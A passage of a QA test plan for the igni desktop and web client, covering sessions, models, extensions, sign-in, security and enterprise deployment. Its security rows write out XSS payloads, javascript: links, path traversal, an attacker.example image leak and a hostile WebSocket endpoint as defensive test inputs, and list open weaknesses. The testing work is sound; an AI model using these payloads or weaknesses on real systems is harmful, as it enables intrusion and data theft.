| SESS-016 | Real backend | Run `/compact`, `/memory`, `/config`, `/whoami`, `/quit` | Each answers in chat; `/quit` says "Use the window/tab close button to quit." | All | PWR | Covered: e2e/live-slash.spec.ts (green again in J1) |
| SESS-017 | Browser profile used with 1.0.3's web UI | Open the 1.0.4 web client | The theme in `ember:theme` and the client id in `ember-code:client-id` are still honoured (legacy keys still in use) | Web | PWF | Planned |
| SESS-018 | Real backend | Run a turn; reload the page | The same session id is shown with its transcript | All | PWR J1 | Covered: e2e/scenario-chat.spec.ts |
| SESS-019 | Real backend | Run 25 turns; reload; scroll to the top | The newest turn is shown at once and the oldest is reachable (the transcript is virtualised) | All | PWR J1 | Covered: e2e/scenario-chat.spec.ts |

### 8.4 Models (MODEL)

| ID | Preconditions | Steps | Expected | Plat | Automation | Status |
|---|---|---|---|---|---|---|
| MODEL-001 | Mocked backend, registry with 3 models | Click the model chip (title "Switch model"), or type `/model` | `ModelMenu` lists `get_model_registry` names sorted | All | VT | Covered: src/components/composer/Composer.mounted.test.tsx |
| MODEL-002 | Real backend | Boot | Every boot RPC decodes; the model chip is not "—" | All | PWR | Covered: e2e/real-be.spec.ts (green again in J1) |
| MODEL-003 | Real backend, two scripted model entries A and B | Pick B, send a message | A `model_switch {model_name:"B"}` frame, an `info` acknowledgement, a footer refresh; the model server receives the next request with B's `model_id` | All | PWR J1 | Covered: e2e/scenario-enterprise.spec.ts (J1; the model server receives the next turn with `model: e2e-second`) |
| MODEL-004 | Real backend, run streaming on A | Switch to B mid-run | The switch is not blocked; the running turn finishes on A and the next turn uses B. The transcript says which model answered | All | PWR J1 | Covered: e2e/scenario-enterprise.spec.ts (J1; the running turn finishes, the next goes to B) |
| MODEL-005 | Real backend, empty `models.registry` and no default | Open the app and send a message | A clear empty state ("no model configured", with where to set one). **Gap:** the chip is hidden when `status.model` is empty (`ComposerBar.tsx:58`), an empty registry opens an empty menu, and there is no empty state | All | PWR J1 | Planned |
| MODEL-006 | Mocked backend, `get_model_registry` fails | Open the picker | The error is shown. **Gap:** only `console.warn` (`useComposerPopup.ts:58`) | All | PWF | Planned |
| MODEL-007 | Registry default A, session switched to B | Open the picker | B is marked current. **Bug:** "current" marks the registry default (`protocol/composerWire.ts:80`) | All | VT | Planned |
| MODEL-008 | Backend refuses a switch | Pick a model | The refusal is reported in the transcript | All | VT | Covered: src/chat/runSettingsSwitcher.test.ts |
| MODEL-009 | Real backend | Type `/model` | The picker opens | All | PWR | Covered: e2e/live-slash.spec.ts (green again in J1) |
| MODEL-010 | Signed in to an igni server that serves a model catalogue (Bedrock / Vertex / Azure / OpenAI / Anthropic proxied by the server) | Open the picker; pick a server model; send | The server's models appear in the registry; the turn goes through the server | All | MAN | Planned |

### 8.5 Extensions (EXT)

| ID | Preconditions | Steps | Expected | Plat | Automation | Status |
|---|---|---|---|---|---|---|
| EXT-001 | Extension installed and READY | Open its page | `ExtensionFrame` frames `origin + entry` with `sandbox="allow-scripts allow-forms allow-same-origin"`, no `allow=` features, and the page label as `title` | All | VT | Covered: src/extensions/ExtensionFrame.test.tsx, src/extensions/ExtensionPage.test.tsx |
| EXT-002 | Mocked backend with an extension page | Open `/?…&open=<page>&note=x` in a fresh browser context | The page opens at the location named | All | PWF | Covered: e2e/shareable-link.spec.ts |
| EXT-003 | Page open | The extension calls `setLocation`; copy the address into a second context | The address follows, and reopens the same state | All | PWF | Covered: e2e/shareable-link.spec.ts |
| EXT-004 | Extension not installed | Open `?open=acme.missing` | The chat opens; no `section.page` | All | PWF | Covered: e2e/shareable-link.spec.ts |
| EXT-005 | Any | Open shareable links with 17 params, a 65-char key, a 513-char value, `__proto__`, and an address over 2,048 chars | Extra or oversized params are dropped (16 keys, key ≤ 64, value ≤ 512, `__proto__` dropped, `pageStack.ts:267`); over 2,048 the params are omitted and the page still opens | All | VT | Planned |
| EXT-006 | Desktop app not running, signed in | macOS `open 'igni://open?open=plugins'`; Linux `xdg-open`; Windows `start` | The app launches, holds the link (`get_current`), and opens the Plugins page after sign-in | Desktop | WD J2, J3; J4 | Planned: the app-not-running case is not covered; J4 sends a link to a running app (that is EXT-007) |
| EXT-007 | Desktop app running and minimised | Follow `igni://open?open=acme.notes&version=2` | The single-instance plugin hands the link to the running app; the focused (or `main`) window is unminimised, shown and focused; `igni-open-link` fires; the page opens with `version=2` | Desktop | WD J2, J3; J4 | Covered: J2 (Linux; the link reaches the running app through single-instance and it opens the page). J4 (macOS) checks that the link is handed to the running app and does not start a second one, but does not assert the page. J3 (Windows) runs the same check and it fails there — the link does not bring the app to the page (F15) |
| EXT-008 | Signed out | Follow a deep link | The link waits until sign-in, then opens | All | VT | Covered: src/lib/useHostBindings.test.tsx ("waits for sign-in") |
| EXT-009 | Shared case table `src/chat/deepLinks.cases.json` | Run both sides | The shell's `DeepLinks::accepts` and the web's `Arrivals.fromDeepLink` agree on every case | Desktop | VT | Covered: src/chat/arrival.test.ts, src-tauri/src/deep_link.rs |
| EXT-010 | Extension granted `foo*` | The frame calls a granted method and a prefix-matched method | Forwarded via `client.asExtension(id)` with `caller` stamped; results return; a failing call's reason comes back as a sentence | All | VT | Covered: src/extensions/ExtensionFrame.test.tsx, src/protocol/extensionCaller.test.ts |
| EXT-011 | Extension without a grant | The frame calls `list_sessions` directly, and via a forged `caller` | The web refuses with "'<id>' is not permitted to call…"; the backend refuses too (`ExtensionRegistry.authorise_caller`), and pool methods are never allowed for a page | All | PWR J1 | Planned (web refusal covered in src/extensions/ExtensionFrame.test.tsx) |
| EXT-012 | Extension service returns 401 | The frame retries | The client asks `extension_service_token` for a new token and the retry succeeds | All | VT | Planned |
| EXT-013 | Group pack with `theme` (accent / danger / success), `brand_name`, `brand_mark` (data: PNG) | Sign in to the group; open an extension page; toggle the theme | The UI uses the brand colours, name and mark; the frame receives the theme again on change (MutationObserver) | All | PWR J1 | Planned (validation covered in src/lib/theme.test.ts) |
| EXT-014 | Extension FAILED or PREPARING, or READY with no UI served | Open its page | "X is FAILED. <reason>" (even with no reason), "X is starting…", or the not-served message; a Back button | All | VT | Covered: src/extensions/ExtensionPage.test.tsx |
| EXT-015 | Extension process hung | Open the Extensions panel | "Not responding: <name>" | All | PWF | Planned |
| EXT-016 | Extension origin serves a page that never posts the handshake, or the origin is down | Open its page | A timeout message with Back. **Gap:** no load or `hello` timeout, no `onError`, no error boundary around `ExtensionFrame`; the user sees a blank frame | All | PWF | Planned |
| EXT-017 | Two extensions contribute the same entry; one tries to shadow an igni entry | Load contributions | No shadowing of igni's or another extension's entries; tool labels do not collide | All | VT | Covered: src/extensions/contributions.test.ts |
| EXT-018 | Mocked backend, window model | An extension writes route / sidebar / composer, a toast, a dialog ("Ship it?") | The page, sidebar and composer change; toast dismissal and the dialog answer are written back | All | PWF | Covered: e2e/window-model.spec.ts |
| EXT-019 | Extension with settings | Edit its settings in the Extensions panel | `set_extension_settings` is sent; an extension cannot contribute igni's settings; unknown types are not guessed | All | VT | Covered: src/components/panels/ExtensionsPanel.test.tsx |
| EXT-020 | Extension posts a chat message containing raw HTML | Render it | The HTML is not rendered | All | VT | Covered: src/extensions/extensionMessageMarkdown.test.tsx |
| EXT-021 | Marketplace plugin | Install `@marketplace/plugin`; install a refused one | It installs by ref; a refusal is shown | All | VT | Covered: src/components/panels/PluginsPanel.test.tsx |
| EXT-022 | `igni ext init --id acme.hello` scaffold installed with `IGNI_DEV_EXTENSIONS=1` | Open its sidebar entry | The page loads in its frame and shows what its own backend returned through the bridge ("hello from the extension backend") | All | PWR J1; WD J2, J3 | Covered: e2e/scenario-enterprise.spec.ts (J1); desktop: J2 Linux, J3 Windows |
| EXT-023 | A faulty extension (unparseable manifest) installed beside a good one | Start the backend; use the chat | The backend starts, the good extension works, the chat answers | All | PWR J1 | Covered: e2e/scenario-enterprise.spec.ts (J1) |
| EXT-024 | EXT-022's extension installed | Open `/?ws=…&open=acme.hello.main` | The page opens directly at that kind | All | PWR J1 | Covered: e2e/scenario-enterprise.spec.ts (J1) |

### 8.6 Sign-in and organisation (AUTH)

| ID | Preconditions | Steps | Expected | Plat | Automation | Status |
|---|---|---|---|---|---|---|
| AUTH-001 | Signed out (`status.cloud_email` empty) | Open the app | `SignedOutApp` shows the `SignInWall` email step (aria-label "Work email", "Continue") | All | VT | Covered: src/components/SignInWall.test.tsx, src/App.test.tsx |
| AUTH-002 | Domain serves `https://<domain>/.well-known/igni.json` | Enter `me@<domain>` | `discover_server {email}`, then `set_server {api_url, portal_url}`, then "Connecting to <host>, found from your address." and "Sign in" | All | VT; MAN against a real domain | Covered: src/components/SignInWall.test.tsx (domain lookup) |
| AUTH-003 | Domain has only the DNS TXT record `_igni.<domain>` (`api_url=…`) | Enter the email | Discovery succeeds through the TXT record (`igni-core/src/igni_core/core/auth/discovery.py`) | All | MAN | Planned |
| AUTH-004 | Discovery finds nothing | Enter the email, then type the server by hand | The "Where is your igni?" step shows the reason; the fields "igni server address" / "igni sign-in page address"; "Connect" saves | All | VT | Covered: src/components/SignInWall.test.tsx |
| AUTH-005 | igni server reachable | Click "Sign in" | The `login` RPC returns `{started, flow_id}`; the system browser opens (desktop: opener plugin; web: new tab); `login_status` / `login_result` arrive; the app flips to signed-in | All | MAN (FEATURE_STATUS #29 is manual only) | Planned |
| AUTH-006 | Login in progress | Click Cancel in `LoginPanel`; repeat while the backend is disconnected | `cancel_login` is sent and the panel closes. **Bug:** when disconnected, `send` throws before `onCancel()`, so the dialog gets stuck (`LoginPanel.tsx:53`, `protocol/client.ts:250`) | All | VT | Planned |
| AUTH-007 | Login fails (server refuses) | Click "Sign in" on the wall | The failure is shown on the wall. **Bug:** `wallLoginFailed` writes to the chat view (`shellActions.ts:82`), which is not rendered while signed out (`App.tsx:132`) | All | PWF | Planned |
| AUTH-008 | Login started, browser closed without finishing | Wait 10 minutes | A timeout with a retry. **Gap:** no client timeout; the panel waits forever | All | MAN | Planned |
| AUTH-009 | Signed in, real backend | Remove the credentials (`clear_cloud_credentials`, or delete `auth.credentials_file`) to simulate expiry | Within one 5 s `get_status` poll the app flips to the sign-in wall; a running turn is not lost silently. There is no client-side expiry handling beyond the poll | All | PWR J1 | Planned |
| AUTH-010 | `discover_server` or `set_server` throws (backend error or server unreachable) | Enter the email | The error is shown on the wall | All | VT | Covered: src/components/SignInWall.test.tsx ("shows a backend that threw rather than swallowing it") |
| AUTH-011 | Signed in; `api_url` goes unreachable (server down) | Use the app, send a message | A clear "igni server unreachable" state. Record the actual behaviour of the model call and `get_group_policy` | All | MAN | Planned |
| AUTH-012 | Signed in | Account chip › `/logout` | Signed out without confirmation (consider adding one); the wall shows; a later deep link waits for sign-in | All | PWR J1 | Planned: live-slash.spec.ts offers but does not run /logout |
| AUTH-013 | Local backend unreachable, status null | Open the app | `auth` is `unknown`: the normal app with a disabled composer, not the wall | All | VT | Planned |
| AUTH-014 | Spawn env `IGNI_GROUP_POLICY_REQUIRED=1`, no verified pack | Open the app and send a message | No session starts; the person is told to connect to igni server (backend enforces, `storage_and_paths.py:67-114`). **Gap:** the web client has no dedicated "group policy required" screen; verify the message is visible and not only in the transcript | All | PWR J1 | Covered: e2e/scenario-enterprise.spec.ts (J1; `IGNI_GROUP_POLICY_REQUIRED=1`: the refusal is shown in the conversation and the model is never called). The dedicated-screen gap stays open |
| AUTH-015 | First open of an untrusted folder; and a policy that forbids trust | Open it | "Trust this folder?" with the folder and git remote; a policy refusal is explained with no way to trust; a folder picked mid-session also asks | All | VT | Covered: src/components/WorkspaceTrustDialog.test.tsx, src/workspaceTrust/model.test.tsx |

### 8.7 Security (SEC)

| ID | Preconditions | Steps | Expected | Plat | Automation | Status |
|---|---|---|---|---|---|---|
| SEC-001 | Scripted model replies with `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`, `<iframe src=…>`, `<svg onload=…>` in markdown | Send | Rendered as text; no element created; no dialog. `PlainMarkdown` has no `rehype-raw` | All | VT; PWR J1 | Covered: src/components/markdown/ChatMarkdown.test.tsx (VT, "SEC-001 renders HTML as text, creating no element"), e2e/scenario-security.spec.ts (J1) |
| SEC-002 | Model replies with `[x](javascript:alert(1))`, `[x](vbscript:…)`, `[x](data:text/html,…)` | Render, then click | The href is neutralised (react-markdown default `urlTransform`); nothing executes | All | VT | Covered: src/components/markdown/ChatMarkdown.test.tsx (VT), e2e/scenario-security.spec.ts (J1) |
| SEC-003 | Desktop, model reply contains `[docs](https://example.com)` | Click it | The capture-phase handler in `init_script.js` hands it to `plugin:opener\|open_url`; the system browser opens; the webview does not navigate | Desktop | WD J2, J3 | Planned |
| SEC-004 | Web client, same reply | Click the link | It opens in a new tab with no opener, and the app's own tab stays put. **Fixed in this branch:** `PlainMarkdown.tsx` renders an `a` (`ReplyLink`); an outward link (`http`, `https`, `mailto`, `tel`) gets `target=_blank` and `rel=noopener noreferrer`. Before this the web client's own tab navigated away and the opened page kept `window.opener` (F2) | Web | PWF | Covered: src/components/markdown/ChatMarkdown.test.tsx (VT, "SEC-004 opens a web link in a new context with no opener and no referrer"), e2e/scenario-security.spec.ts; fixed in this branch: the `PlainMarkdown` link renderer (`target=_blank`, `rel=noopener noreferrer`) |
| SEC-005 | Desktop, reply links `file:///etc/passwd`, `smb://host/share`, `ms-msdt:…`, `igni://open?open=plugins` | Click each | Nothing outside the app opens (`isExternal` admits only http, https, mailto, tel); the webview does not navigate to a `file:` URL | Desktop | WD J2, J3; MAN on M | Planned |
| SEC-006 | Reply contains `![](https://attacker.example/p.png?leak=…)` | Render | Desktop: blocked by CSP `img-src 'self' data: blob:`. **Gap (web):** `clients/web/index.html` has no CSP, so the remote request is made unless the hosting server sets one. README rendering forbids remote images, chat does not | All | PWF; WD J2 | Planned |
| SEC-007 | Script `huge(10 MB)` in one delta; a tool result of 10 MB; a 1M-char single line | Send | The UI stays responsive and the content is truncated with a "show more". **Gap:** no truncation of assistant text or tool results; only attachments are capped (5 MB, `composerWire.ts:16`) | All | PWR J1 | Covered: e2e/scenario-security.spec.ts (J1; 2 MB on one line, a frame within 2 s, next turn answered); the truncation gap stays open |
| SEC-008 | Tool cards and `@` picker entries with file names `<img src=x onerror=…>.py`, `a\u202Etxt.exe`, `../../etc/passwd`, names with newlines | Render the tool card, `FilePill` and picker | Shown as text; the RTL override is visible or neutralised; nothing executes | All | VT | Covered: e2e/scenario-security.spec.ts (J1; the `<img onerror>` name in a tool result and the `@` picker); RTL-override and newline names stay planned |
| SEC-009 | Desktop; model output references `~/Downloads/run.command` (macOS), `~/Downloads/x.bat` (Windows), or an `.app` bundle | Click the file pill (`__IGNI_HOST__.openFile` → `plugin:opener\|open_path`) | Executables are not launched without a confirmation. **Finding:** the grant is `$HOME/**` (`capabilities/default.json:13-14`), so the OS default handler runs them | Desktop | MAN; WD J2 | Planned |
| SEC-010 | Desktop | Open `/etc/hosts` or `C:\Windows\win.ini` from a file pill | Refused by the opener scope; falls back to the in-app `FilePreview` | Desktop | WD J2, J3 | Planned (scope covered in src-tauri/tests/config_contracts.rs; fallback in src/lib/host.test.ts) |
| SEC-011 | Desktop | Open `~/.ssh/id_rsa` and `~/.igni/credentials.json` from a file pill | Not opened by the OS ("dotfiles stay out of reach" per commit 0bea7046). The opener glob's leading-dot behaviour is untested | Desktop | WD J2, J3 | Planned |
| SEC-012 | Desktop | `__IGNI_HOST__.revealInFolder('/etc')` from the console of a debug build | Should be limited like `open_path`. **Finding:** `opener:allow-reveal-item-in-dir` is unscoped | Desktop | MAN | Planned |
| SEC-013 | Deep links `igni://open?open=..%2Fetc`, `?open=%3Cscript%3E`, `&ws=ws%3A%2F%2Fevil&host=web` | Follow each | No arrival for the hostile kinds; `ws`/`host` are stripped; igni's own params are never written to the address bar | All | VT | Covered: src/chat/arrival.test.ts, src-tauri/src/deep_link.rs; web, real backend: e2e/scenario-security.spec.ts |
| SEC-014 | Deep links `igni://elsewhere?…`, `xigni://…`, `igni:open`, `https://…`, `file:///etc/passwd` | Follow each | The shell does not take them; the web makes no arrival | Desktop | VT | Covered: src/chat/arrival.test.ts, src-tauri/src/deep_link.rs |
| SEC-015 | Deep link with a 2,000-char query and a 1 MB fragment | Follow it | Refused or the fragment dropped before holding. **Gap:** `MAX_QUERY` applies after the fragment is stripped, but the whole link is held (`deep_link.rs:61-65`) | Desktop | VT (Rust) | Planned |
| SEC-016 | App launched as `igni igni://open?open=plugins` | Launch | The link is not taken as the project directory (`launch_args.rs:36`) | Desktop | VT (Rust) | Covered: src-tauri/src/launch_args.rs, src-tauri/src/deep_link.rs |
| SEC-017 | Mocked backend | Open `?open=<img src=x onerror=alert(1)>` | The chat opens; no page, no `img[src=x]`, 0 dialogs | All | PWF | Covered: e2e/shareable-link.spec.ts, e2e/scenario-security.spec.ts (J1) |
| SEC-018 | Self-hosted web client | A crafted link `https://igni.corp/?ws=ws://attacker.example:8765` | The client must not silently connect a signed-in user to a foreign backend. **Finding:** `wsEndpoint.ts` honours any top-level `?ws=`; only page-level params strip `ws`. Mitigation (allowlist or confirmation) needed for hosted deployments | Web | PWF | Planned |
| SEC-019 | Backend spawned with `IGNI_WS_TOKEN` | Connect with no `igni-token.` subprotocol; then with a wrong token | Refused (`ws_auth.py`, `hmac.compare_digest`). Note: every spawned backend now gets a per-launch `IGNI_WS_TOKEN` (section 6) and the page is handed the same token; a borrowed backend (`IGNI_LIVE_WS`) is the only one that runs without one | All | PWR J1 | Covered: e2e/scenario-security.spec.ts (J1; no token and a wrong token refused, the right one accepted). Every live spec now runs with a token |
| SEC-020 | Desktop, backend spawned | Inspect the backend's argv (`ps`, Process Explorer) and the shell's navigation | The token is in env only (`IGNI_WS_TOKEN`, popped by the backend), never argv; the web reads it from the fragment only (`#igni_ws_token=`), never the query | Desktop | WD J2, J3; VT | Covered: J4 (the argv half — the backend's command line carries no token) |
| SEC-021 | Token required, Playwright page served from `http://evil.example` (route-mapped) | Open a WebSocket to the backend | HTTP 403 before the upgrade (`origin_allowed`, `ws_auth.py:116-128`) | All | PWR J1 | Covered: e2e/scenario-security.spec.ts (J1; `https://evil.example`, `null` and `127.0.0.1.evil.example` get 403 with the right token; loopback and `tauri://localhost` get 101) |
| SEC-022 | Backend running without a token (hand-started, as in e2e) | From `http://localhost:3000` (another local web app) and from a client with no Origin header, connect | **Finding:** every loopback origin on any port is accepted, and a missing Origin is accepted (`ws_auth.py:116-128,199`). With no token any local page can drive the backend. Document that a token is mandatory outside development | All | PWR J1 | Planned |
| SEC-023 | Attached backend; a client using the lockfile program token | Try to answer a pending approval | Refused: PROGRAM standing cannot approve | All | PWR J1 | Planned |
| SEC-024 | Built desktop app | Through WebDriver, try to add an inline `<script>` and a remote script to the main window, and read the CSP in force | The window runs under the configured CSP: `script-src 'self'`, `object-src 'none'`, `frame-ancestors 'none'`; inline script blocked | Desktop | WD J2 | Covered: J2 Linux, J3 Windows (an injected inline script does not run in the app window) |
| SEC-025 | Built desktop app | Review the CSP | **Finding:** `connect-src` and `frame-src` admit every loopback port, so the webview can reach or frame any local service; `style-src 'unsafe-inline'`. Narrow to the backend's port if feasible | Desktop | MAN | Planned |
| SEC-026 | Extension served from a non-loopback origin | Open its page in the desktop app | Blocked by `frame-src` (loopback only); the web client has no CSP of its own (see SEC-006); extension pages get no separate CSP from the shell | Desktop, Web | WD J2; PWF | Covered: e2e/scenario-enterprise.spec.ts (J1; the extension page is served with `script-src` and `frame-ancestors`, no inline script); the non-loopback-origin case stays planned |
| SEC-027 | Extension frame | Post messages from another origin, from another window on the same origin, with a wrong nonce, malformed, and with an unknown bridge version | All are ignored; nothing is posted before load; each mount has its own nonce | All | VT | Covered: src/extensions/ExtensionFrame.test.tsx, src/extensions/location.test.tsx |
| SEC-028 | Extension frame | The frame tries `top.location=…`, `window.open`, `alert` | Blocked by the sandbox (no top-navigation, popups or modals) | All | VT | Covered: src/extensions/ExtensionFrame.test.tsx |
| SEC-029 | Group branding with `brand_mark: javascript:…`, a remote URL, a non-image data: URI, a theme value `red; background:url(…)` | Apply | All refused; only hex colours and allowlisted keys | All | VT | Covered: src/lib/theme.test.ts |
| SEC-030 | Plugin README with script, iframe, event handlers, `javascript:` links, remote background-image | Render on the plugins page | Stripped; links forced to `rel="noopener noreferrer"` | All | VT | Covered: src/components/markdown/ReadmeMarkdown.test.tsx |
| SEC-031 | `openExternal` with `http://`, `https://user:pass@host`, a host-less URL | Call it | Only https with a host and no credentials opens | All | VT | Covered: src/lib/host.test.ts |
| SEC-032 | Model emits a mermaid block with `click A "javascript:alert(1)"` and `%%{init: {"securityLevel":"loose"}}%%` | Render | No script runs and no link is followed. Verify `MermaidBlock`'s `securityLevel` in `@ignite-ember/ui-react` | All | VT | Covered: e2e/scenario-security.spec.ts (J1; HTML labels and `click … javascript:` in a mermaid block run nothing) |
| SEC-033 | HITL request whose args contain HTML, ANSI escapes and a 1 MB string | Render `HitlArgsView` | Text only; bounded height; buttons stay reachable | All | VT | Planned |
| SEC-034 | First-run managed install on a network where an attacker can intercept `github.com` (lab MITM with a trusted rogue CA) | Launch | The uv archive must be verified. **Finding:** no hash or signature check (`runtime/uv.rs:64-98`) and no `--require-hashes` for the pip install (`managed.rs:263-270`); only TLS protects them. Downloads also go to predictable temp paths `uv-download-{pid}.*` (`uv.rs:84,100`) | Desktop | MAN | Planned |
| SEC-035 | `~/.igni/config.yaml` written by a non-admin process with `runtime_python: /tmp/evil` | Launch | Only an admin-controlled layer can name the interpreter. **Finding:** `runtime_python` is honoured from the user file (`desktop_settings.rs:111`), so anything that can write it gets an executable launched at start | Desktop | MAN; VT (Rust) | Planned |

### 8.8 Enterprise deployment (ENT)

| ID | Preconditions | Steps | Expected | Plat | Automation | Status |
|---|---|---|---|---|---|---|
| ENT-001 | `/Library/Application Support/igni/managed-settings.yaml` with `update_check_ttl: 0` | Launch; igni menu › Check for Updates… | No request leaves for the update endpoint; the menu's check answers that updates are managed off | M | MAN with MDM | Planned |
| ENT-002 | `/etc/igni/managed-settings.yaml` with `air_gapped: true` | Launch with egress blocked | No contact with the compiled endpoint or GitHub; the backend denies web_search/web_fetch | L | WD J2 | Planned |
| ENT-003 | `%PROGRAMDATA%\igni\managed-settings.yaml` (YAML), then the same as JSON (leading `{`) | Launch each | Both forms read; settings apply | W | WD J3 | Covered: J3 (the YAML form — `%PROGRAMDATA%\igni\managed-settings.yaml` with `air_gapped`, `runtime_python`, `update_endpoint` is honoured); the JSON form stays planned |
| ENT-004 | Values in managed, group pack and `~/.igni/config.yaml` disagree | Launch | Managed wins over the pack, which wins over the user file; the project `.igni/config.yaml` is not read by the shell; indented keys are ignored | Desktop | VT (Rust) | Covered: src-tauri/src/desktop_settings.rs, src-tauri/src/update_policy.rs |
| ENT-005 | JSON managed file with `"update_check_ttl": "soon"` | Launch | Treated as unset, as in YAML. **Bug:** the JSON path yields `checks_disabled=Some(false)` and overrides lower layers (`desktop_settings.rs:81`) | Desktop | VT (Rust) | Planned |
| ENT-006 | macOS configuration profile (plist domain) or a Windows GPO / registry policy | Deploy policy that way | **Not implemented — gap:** only `managed-settings.yaml` files are read (`desktop_settings.rs:155-166`; igni-core `core/paths.py:125-156`) | M, W | MAN | Planned |
| ENT-007 | `group_policy.trusted_keys` in the managed file; another key in `~/.igni/config.yaml` | Launch with a pack signed by each key | Only managed-file pins count (or `IGNI_GROUP_POLICY_TRUSTED_KEYS`); the user-file value is discarded with a warning (`ManagedOnlyTier`); a pack signed by an unpinned key is ignored | Desktop | VT (Rust); PWR J1 | Planned (pin matching covered in src-tauri/src/group_pack/mod.rs) |
| ENT-008 | `group_policy.required: true` in the managed file, no pack | Launch | No session starts until the person connects to igni server; the backend tries a fetch first | Desktop | WD J2 (root-written `/etc/igni`) | Covered: e2e/scenario-enterprise.spec.ts (J1; the environment form); the managed-file form on a desktop stays planned (J2) |
| ENT-009 | `group_policy.required: true` only in the user or project config | Launch | Ignored with a warning (managed-only key) | Desktop | PWR J1 | Covered: e2e/scenario-enterprise.spec.ts (J1; `group_policy.required` in the project config is ignored, the turn runs) |
| ENT-010 | Genuine, forged, other-subject, other-issuer, rolled-back and unsigned packs | Launch with each | Only the genuine pack applies; failures are logged "group policy pack ignored (…)" and the layer dropped; the unsigned `group_settings.json` of 1.0.3 is ignored | Desktop | VT (Rust) | Covered: src-tauri/src/group_pack/mod.rs, src-tauri/src/desktop_settings.rs |
| ENT-011 | Pack without pins | Replace `~/.igni/group-policy/jwks.json` with an attacker key and re-sign the pack | Should be refused. **Finding:** without pins the JWKS in the user-writable directory is trusted (`group_pack/mod.rs:19-21`); enterprises must set `trusted_keys` | Desktop | MAN | Planned |
| ENT-012 | Egress only through `HTTPS_PROXY=http://proxy:3128`, no managed runtime yet | First launch (managed install) | The uv download, `uv python install`, the pip install and the Hugging Face prefetch all go through the proxy. **Likely gap:** the uv download uses ureq without `try_proxy_from_env` (`uv.rs:71-74`); later steps inherit the env | Desktop | MAN (lab squid); WD J2 variant | Planned |
| ENT-013 | TLS-intercepting proxy with a corporate CA in the OS trust store | First launch | The downloads succeed. **Likely gap:** ureq is built with rustls and bundled webpki roots (`Cargo.toml:42`), not the OS store; uv/pip need `SSL_CERT_FILE` or native-TLS settings | Desktop | MAN | Planned |
| ENT-014 | Proxy only; signed in | Use chat (model via igni server or provider) and sign-in discovery | Model and server traffic go through the proxy. **Gap:** no proxy setting in shell or backend config; behaviour depends on each HTTP library honouring env | Desktop | MAN | Covered: e2e/scenario-enterprise.spec.ts (J1; the model traffic — HTTP(S)_PROXY, a model host only the proxy resolves, the proxy log shows the call); sign-in discovery through the proxy stays manual |
| ENT-015 | Managed file `air_gapped: true`, `runtime_python: /opt/igni/venv/bin/python` (igni-core and the model pre-installed); no network (`unshare -n`, or a firewall) | Launch; File › Diagnose Backend; run a scripted-model turn against an internal model host in `network.internal_hosts` | Starts with no download attempt; Diagnose shows source "provisioned" and the interpreter; chat works against the internal host | L, W | WD J2, J3 | Covered: J2 (Linux, `/etc/igni/managed-settings.yaml`), J3 (Windows, `%PROGRAMDATA%\igni\managed-settings.yaml`): `air_gapped: true` and `runtime_python` start the app on it with no download, a turn is answered; J4 (macOS, `runtime_python` in the user config) |
| ENT-016 | `air_gapped: true`, no `runtime_python`, no managed runtime | Launch | The install refuses with the instruction to set `runtime_python` or `IGNI_RUNTIME_PYTHON` (`managed.rs:150,192-201`); "Bootstrap failed: …" shown | Desktop | WD J2 | Covered: J2 (Linux, `IGNI_AIR_GAPPED=1` and no runtime: the loading view shows the refusal naming `runtime_python`, no managed venv). J3 found the refusal lost on Windows (F14, fixed in this branch) |
| ENT-017 | `runtime_python` points at a non-executable file, or a Python without igni_core | Launch | "runtime_python (...) is not an executable" / "...cannot import igni_core"; never falls back to downloading | Desktop | VT (Rust); WD J2 | Covered: src-tauri/src/runtime/provisioned.rs (logic; UI leg Planned) |
| ENT-018 | `IGNI_RUNTIME_PYTHON` and `runtime_python` both set; `IGNI_AIR_GAPPED=1` with managed `air_gapped: false` | Launch | The env interpreter wins; the env var turns air-gap on (it can never turn it off) | Desktop | VT (Rust) | Covered: src-tauri/src/runtime/provisioned.rs, src-tauri/src/update_policy.rs |
| ENT-019 | Provisioned runtime, air-gapped, no Hugging Face cache | Launch and run a turn that needs the decisions model | Works or fails clearly. Record whether `HF_HOME` must be provisioned (the shell sets it only for the managed venv, `runtime/managed.rs:163-166`) | Desktop | MAN | Planned |
| ENT-020 | macOS fleet | Deploy with no user interaction | A signed .pkg or documented `hdiutil attach` + `ditto` path. **Gap:** only a `.dmg` is published; no MDM package | M | J4 (scripted dmg copy); MAN | Planned |
| ENT-021 | Windows fleet | `msiexec /i igni_1.0.4_x64_en-US.msi /qn /l*v install.log`; NSIS `igni_1.0.4_x64-setup.exe /S` | Installs silently without prompts; the app launches; `msiexec /x … /qn` removes it | W | WD J3 | Covered: J3 (NSIS `/S` install and silent uninstall; MSI `msiexec /i … /qn` and `msiexec /x … /qn`) |
| ENT-022 | Linux fleet | `sudo apt install ./igni_1.0.4_amd64.deb`; the AppImage | Both install and launch. **Doc finding:** docs mention only the AppImage, but `bundle.targets: "all"` also produces `.deb`/`.rpm`/NSIS and nothing in `release.yml` prunes them | L | WD J2 | Covered: J2 (the .deb — `apt-get install ./igni_*.deb`, scheme handler present); AppImage stays planned |
| ENT-023 | Managed `update_endpoint: https://mirror.corp/igni/latest.json` hosting a correctly signed update | Check for Updates…; install | Only the mirror is contacted; the signature is checked against the compiled pubkey; the app restarts into the new version | M | J4 (local HTTPS mirror) | Planned (policy covered in src-tauri/src/update_policy.rs, src-tauri/src/updater.rs) |
| ENT-024 | `update_endpoint: http://mirror.corp/…` (plain HTTP), or an invalid URL | Check for Updates… | An error, never a fallback to the vendor host | M | VT (Rust); J4 | Covered: J2, J3 (a plain-HTTP managed `update_endpoint` is refused with an error naming it, and nothing is asked) |
| ENT-025 | Mirror serves a payload signed with another key, or a tampered `.tar.gz` | Install the update | Refused; the current version keeps running | M | J4; MAN | Planned |
| ENT-026 | Enterprise wants a beta or stable channel | Look for a channel setting | **Not implemented — gap:** no channels; only one `update_endpoint` mirror | Desktop | MAN | Planned |
| ENT-027 | Windows and Linux | Check for Updates… | Answers truthfully that self-update is macOS-only (`latest.json` carries only `darwin-aarch64`, `release.yml:564-565`); does not report "up to date" falsely | W, L | WD J2, J3 | Planned |
| ENT-028 | Default endpoint | Resolve `https://github.com/ignite-ember/igni/releases/latest/download/latest.json` | Resolves to igni-app's `latest.json`. **Finding:** the compiled endpoint uses the old repo name and relies on GitHub's rename redirect (`tauri.conf.json:22-23`) | M | J4 | Planned |
